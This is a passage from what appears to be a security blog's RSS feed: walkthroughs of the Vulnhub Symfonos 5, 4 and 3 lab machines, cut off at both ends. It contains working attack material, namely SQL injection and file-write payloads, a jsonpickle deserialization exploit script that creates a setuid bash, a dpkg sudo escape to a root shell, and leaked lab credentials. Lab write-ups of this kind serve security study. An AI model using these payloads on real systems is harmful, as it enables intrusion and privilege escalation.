&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From admin.php we get credentials that can be used on ldap.&lt;/p&gt;
&lt;h1 id=&#34;getting-shell-as-zeus&#34;&gt;Getting shell as zeus&lt;/h1&gt;
&lt;p&gt;With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ldapsearch -x -h 192.168.191.132 -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span&gt; -w qMDdyZh3cT6eeAWD -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the output, the userPassword is base64 encoded. After decoding it we get &lt;code&gt;cetkKf4wCuHC9FET&lt;/code&gt; and can login
as zeus via ssh.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Running &lt;code&gt;sudo -l&lt;/code&gt;, we see that zeus has sudo permissions to run dpkg with no password.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From &lt;a href=&#34;https://gtfobins.github.io/gtfobins/dpkg/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;gtfobins&lt;/a&gt;

 we only need to execute the below commands to
abuse this.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo dpkg -l
!/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;When accessing the passwd file, we couldn&amp;rsquo;t see any user with home directory in /home looking at the configuration
postexploitation we see that the services are running in docker containers.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 4</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos4/</link>
      <pubDate>Mon, 15 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos4/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;20 Aug 2019&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;For this box, some directory bruteforce is needed to discover some php files. One of the php files has an lfi
vulnerability but can only be access by authenticating to the other page. The login form can be bypassed and
we exploit the lfi. For that we poison ssh logs for exploitation to rce. For privilege escalation we exploit
a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.105
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00033s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/html&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
and files.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-26.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing a bruteforce with ffuf we get a &lt;strong&gt;gods&lt;/strong&gt; directory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt; | tee root.ffuf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In this directory we only have some files, with nothing useful in them.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The contents:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I decided to use the contents of the files to generate a wordlist for more bruteforce using curl.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this new words I performed bruteforce again but adding extensions.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From this we discover &lt;strong&gt;sea.php&lt;/strong&gt; .&lt;/p&gt;
&lt;p&gt;When we try to visit this file, we get redirected to atlantis.php which has a login form.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On this form if we submit random creds, then visit sea.php afterwards. We are able to access it. I think this
behaviour is related to the cookies the app sends after trying to login.&lt;/p&gt;
&lt;p&gt;The sea.php has form that loads files based on the god we select. The contents are the log files we discovered
in /gods. Based on this behaviour we can try and exploit lfi to get rce.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since the on the url we are passing hades, and it loads content of hades.log. We can assume it appends .log
to our input. This restricts us to only loading log files, but that should be sufficient for lfi to rce.&lt;/p&gt;
&lt;p&gt;After testing a few log files I could only access auth.log which is located in /var/log/auth.log. These are ssh logs.&lt;/p&gt;
&lt;h1 id=&#34;getting-shell-as-www-data&#34;&gt;Getting shell as www-data&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s poison the ssh log by add php code in the username for rce.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can pass the command id to test if we were successful.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In the response we have www-data output. Now we can send our reverse shell payload.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Shell:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In the webroot we can read atlantis.php that had the login form and here we get db creds.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The discovered password is also the password for the poseidon user.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Performing some manual enumeration locally for privesc paths, I took a look at local listening services. I
discovered port 8080 which I used ssh portforwarding to access from my host.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-19.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;A simple web app is running.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking back at running processes, this appears to be a python app which is running as root. Looks like this is our
path to privesc.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-21.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;In /opt I found the source code:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-20.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Based on the use of pickle, we need to exploit deserialization through the cookie.&lt;/p&gt;
&lt;p&gt;I came up with the below script to generate a base64 encoded cookie which when deserialized
will create a setuid binary of bash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; jsonpickle
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RCE&lt;/span&gt;(object):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__reduce__&lt;/span&gt;(self):
        cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system, (cmd,)

encoded &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(jsonpickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(RCE()))
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(encoded)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-22.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Setting the cookie and sending the request using burpsuite:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-23.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We get suidbash&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-24.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;And we finally get a root shell:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-25.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;h2 id=&#34;checking-the-redirect-on-accessing-the-seaphp&#34;&gt;Checking the redirect on accessing the sea.php.&lt;/h2&gt;
&lt;p&gt;The code on sea.php only checks if the session isset but not what value it is set to. From atlantis.php when you send wrong creds,
the &lt;code&gt;$_SESSION[&#39;logged_in&#39;]&lt;/code&gt; is set to false.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-27.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;sql-injection-on-atlantisphp-login-form&#34;&gt;SQL Injection on atlantis.php login form.&lt;/h2&gt;
&lt;p&gt;When you supply username &lt;code&gt;admin&#39; or 1=1-- -&lt;/code&gt; and a random password we get a redirect to sea.php but with
&lt;code&gt;admin&#39; and 1=2-- -&lt;/code&gt; we get a incorrect login.&lt;/p&gt;
&lt;p&gt;This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
and exploit this with sqlmap.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-28.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sqlmap -r atlantis.req --batch --dump --level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; --risk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; --threads&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
I tried this but couldn&amp;rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.&lt;/p&gt;
&lt;p&gt;Using this payload in my post request to write to a file using select, we don&amp;rsquo;t get the usual redirect that
signifies that the query was successful.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=admin&#39; and 1=2 Union Select 1,&#39;2&#39; INTO OUTFILE &#39;/tmp/test.log&#39;-- -&amp;amp;password=a
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-29.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The file is actually written to disk if we check the /tmp folder.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-30.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The reason that we don&amp;rsquo;t get a redirect is that no rows are returned by the query when writing files therefore
the php code returns a false and doesn&amp;rsquo;t redirect to sea.php.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-31.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now if we try to include the test.log in /tmp using the lfi, it fails. The reason for this is because some services are
configured to have a private tmp folder which isn&amp;rsquo;t the same as the usual /tmp. The below answer I found explains this.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-32.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;If you look at the previous screenshot you&amp;rsquo;ll notice the folders beginning with systemd-private and one of those seem to
belong to apache2.&lt;/p&gt;
&lt;p&gt;With this knowledge, we need to use other directories to write files in. Since we are exploiting sql injection for this,
we need folders that the mysql user can write. I discovered /var/lib/mysql and /dev/shm are suitable for this.&lt;/p&gt;
&lt;p&gt;Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-existent file.&lt;/p&gt;
&lt;p&gt;Testing this using /var/lib/mysql the file gets written.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=admin&#39; and 1=2 Union Select 1,&#39;test&#39; INTO OUTFILE &#39;/var/lib/mysql/123456.log&#39;-- -&amp;amp;password=a
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-33.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then accessing it using the lfi works this time.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos4/symfonos4-34.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Something else also to note is that the db user in this case is the mysql root user.&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 3</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos3/</link>
      <pubDate>Thu, 11 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos3/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Intermediate&lt;/td&gt;
&lt;td&gt;7 Apr 2020&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;In this box, we need to perform some directory bruteforce then use shellshock vulnerability to get our first shell.
We then sniff local traffic using tcpdump and get credentials for the next user who has permissions to write python2.7 lib
directory. Using those write permissions we hijack a library that is imported in a script that is executed by root in a
cron job. We create a suid bash binary that we use to get a root shell.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-nmap&#34; data-lang=&#34;nmap&#34;&gt;Nmap scan report for 192.168.191.130
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn&#39;t have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;Visiting the IP on the browser, all we get is a picture.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Viewing the source doesn&amp;rsquo;t reveal much.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Going to the research endpoint, there&amp;rsquo;s information about the Underworld and Greek mythology.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Some of the words look similar to the directories we discovered, so let&amp;rsquo;s create a wordlist which maybe helpful later.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The current directories we have discovered don&amp;rsquo;t have much in them. At this point I was stuck a bit, after looking at
some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
with a trailing slash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos3/symfonos3-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I&amp;rsquo;ll use going forward. The presence of
cgi-bin could potentially mean we can have a shellshock vulnerability.&lt;/p&gt;
&lt;p&gt;Running another bruteforce using the wordlist I created earlier didn&amp;rsquo;t work. I then thought to get a lowercase version of the
words and try it.&lt;/p&gt;
